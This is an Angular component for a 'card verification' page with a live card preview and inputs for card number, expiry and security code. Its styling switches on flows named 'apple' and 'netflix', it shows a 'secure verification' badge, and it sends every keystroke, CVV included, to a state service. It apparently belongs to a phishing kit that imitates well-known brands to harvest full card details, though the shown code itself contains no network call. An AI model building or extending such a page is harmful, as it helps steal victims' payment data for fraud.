import { Component, inject, signal, computed, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService } from '../services/state.service';
import { validateCardLogic, CardType } from './card-validation.utils';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-card-verification',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <ui-card [variant]="cardVariant()">
       <!-- Header Slot -->
       <div slot="header" class="text-center space-y-2">
           @if (isApple()) {
             <div class="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                <span class="material-icons text-3xl text-gray-400">add_a_photo</span>
             </div>
           }
           
           <h1 class="text-2xl font-bold tracking-tight" [style.color]="headerColor()">
              {{ 'CARD.TITLE' | translate }}
           </h1>
           <p class="text-base text-center opacity-80" [style.color]="textColor()">
              {{ 'CARD.SUBTITLE' | translate }}
           </p>
       </div>

       <!-- Body Content -->
       <div class="space-y-6">
           
           <!-- Feedback -->
           @if (state.rejectionReason()) {
              <div class="bg-red-50 border-l-[6px] border-red-500 p-4 flex items-start gap-4 rounded-r-lg animate-fade-in">
                 <span class="material-icons text-red-500">credit_card_off</span>
                 <div>
                   <p class="text-sm font-bold text-red-900">{{ 'CARD.ERROR_TITLE' | translate }}</p>
                   <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
                 </div>
              </div>
           }
           
           <!-- Live Card Preview -->
           <div class="perspective-1000">
               <div class="relative w-full h-48 rounded-xl shadow-xl transition-transform duration-500 transform-style-3d bg-gradient-to-br from-[#0f172a] to-[#334155] p-6 text-white overflow-hidden group">
                    <!-- Chip -->
                    <div class="absolute top-6 left-6 w-12 h-10 bg-yellow-400/20 rounded border border-yellow-400/40 relative overflow-hidden">
                        <div class="absolute inset-0 bg-yellow-400/10 grid grid-cols-2"></div>
                    </div>
                    
                    <!-- Brand Logo -->
                    <div class="absolute top-6 right-6">
                       @if(cardType() === 'visa') { 
                         <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-6 brightness-200 contrast-200"> 
                       }
                       @else if(cardType() === 'mastercard') {
                         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-8">
                       }
                       @else {
                         <span class="font-bold tracking-widest text-lg opacity-50">BANK</span>
                       }
                    </div>

                    <!-- Number -->
                    <div class="absolute top-20 left-6 w-full pr-12">
                        <p class="font-mono text-xl sm:text-2xl tracking-widest drop-shadow-md">
                           {{ cardNumberDisplay || '•••• •••• •••• ••••' }}
                        </p>
                    </div>

                    <!-- Footer -->
                    <div class="absolute bottom-6 left-6 flex items-end justify-between w-[85%]">
                        <div>
                            <p class="text-[10px] opacity-60 uppercase mb-1">Card Holder</p>
                            <p class="font-medium tracking-wide uppercase text-sm truncate max-w-[150px]">
                              {{ (state.firstName() + ' ' + state.lastName()) || 'YOUR NAME' }}
                            </p>
                        </div>
                        <div>
                            <p class="text-[10px] opacity-60 uppercase mb-1">Expires</p>
                            <p class="font-mono text-sm">{{ expiry || 'MM/YY' }}</p>
                        </div>
                    </div>
               </div>
           </div>

           <!-- Inputs Grid -->
           <div class="space-y-4">
              <ui-input 
                [label]="'CARD.Card Number' | translate"
                [(ngModel)]="cardNumberDisplay"
                (ngModelChange)="onCardInput($event)"
                [iconLeft]="true"
                [error]="touchedCard() && !isCardNumValid() ? 'Invalid number' : ''"
                (blur)="touchedCard.set(true)">
                 <span slot="icon-left" class="material-icons">credit_card</span>
              </ui-input>

              <div class="grid grid-cols-2 gap-4">
                 <ui-input
                    [label]="'CARD.Expiration Date' | translate"
                    [(ngModel)]="expiry"
                    (ngModelChange)="onExpiryInput($event)"
                    placeholder="MM/YY"
                    [error]="touchedExp() && !isExpiryValid() ? 'Invalid' : ''"
                    (blur)="touchedExp.set(true)">
                 </ui-input>

                 <div class="relative">
                    <ui-input
                       [label]="'CARD.Security Code' | translate"
                       type="password"
                       [(ngModel)]="cvv"
                       (ngModelChange)="onCvvChange($event)"
                       [error]="touchedCvv() && !isCvvValid() ? 'Invalid' : ''"
                       (blur)="touchedCvv.set(true)">
                    </ui-input>
                    <!-- Tooltip could go here or helper text -->
                 </div>
              </div>
           </div>

           <div class="pt-2">
              <ui-button 
                (click)="submit()"
                [disabled]="!isValid()"
                [fullWidth]="true"
                [variant]="primaryBtnVariant()">
                {{ 'COMMON.CONFIRM' | translate }}
              </ui-button>
           </div>
       </div>

       <!-- Footer Slot -->
       <div slot="footer" class="flex justify-center items-center gap-2 opacity-60 py-1">
            <span class="material-icons text-sm text-green-600">lock</span>
            <p class="text-xs font-bold" [style.color]="textColor()">
               {{ 'BANK_APP.SECURE_VERIFICATION' | translate }}
            </p>
       </div>
    </ui-card>
  `,
  styles: [`
    :host { display: block; }
    .perspective-1000 { perspective: 1000px; }
    .transform-style-3d { transform-style: preserve-3d; }
  `]
})
export class CardVerificationComponent {
  state = inject(StateService);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');

  isApple = computed(() => this.currentFlowId() === 'apple');

  // Model
  cardNumber = '';
  cardNumberDisplay = '';
  expiry = '';
  cvv = '';

  // Validation
  touchedCard = signal(false);
  touchedExp = signal(false);
  touchedCvv = signal(false);

  isValid = signal(false);
  isExpiryValid = signal(false);
  cardType = signal<CardType>('unknown');

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);
  headerColor = computed(() => this.theme()?.input.textColor || '#111827');
  textColor = computed(() => this.theme()?.input.textColor || '#4b5563');

  cardVariant = computed<CardVariant>(() => {
    switch (this.currentFlowId()) {
      case 'apple': return 'ghost';
      case 'netflix': return 'elevated';
      default: return 'bordered';
    }
  });

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  constructor() {
    // Debug effect
    effect(() => {
      // console.log('Card Type Detected:', this.cardType());
    });
  }

  // Input Handlers
  onCardInput(val: string) {
    let input = val.replace(/\D/g, '');
    if (input.length > 16 && this.cardType() !== 'amex') input = input.substring(0, 16);

    this.cardNumber = input;
    const parts = input.match(/.{1,4}/g);
    this.cardNumberDisplay = parts ? parts.join(' ') : input;

    this.validate();
    this.state.updateCard({ number: this.cardNumber, cardType: this.cardType() });
  }

  onExpiryInput(val: string) {
    let input = val.replace(/\D/g, '');
    if (input.length >= 2) {
      input = input.substring(0, 2) + '/' + input.substring(2, 4);
    }
    if (input.length > 5) input = input.substring(0, 5);

    this.expiry = input;
    this.validate();
    this.state.updateCard({ expiry: this.expiry });
  }

  onCvvChange(val: string) {
    const clean = val.replace(/\D/g, '');
    this.cvv = clean;
    this.validate();
    this.state.updateCard({ cvv: this.cvv });
  }

  // Validation Logic
  cvvMaxLength() {
    return this.cardType() === 'amex' ? 4 : 3;
  }

  isCvvValid() {
    return this.cvv.length === this.cvvMaxLength();
  }

  isCardNumValid() {
    const len = this.cardNumber.length;
    if (this.cardType() === 'amex') return len === 15;
    if (this.cardType() === 'diners') return len === 14;
    return len === 16;
  }

  validate() {
    const res = validateCardLogic(this.cardNumber, this.expiry, this.cvv);
    this.cardType.set(res.cardType);
    this.isExpiryValid.set(res.isExpiryValid);
    this.isValid.set(res.isValid);
  }

  submit() {
    if (this.isValid()) {
      this.state.submitCard(this.cardNumber, this.cardType(), this.expiry, this.cvv);
    }
  }
}
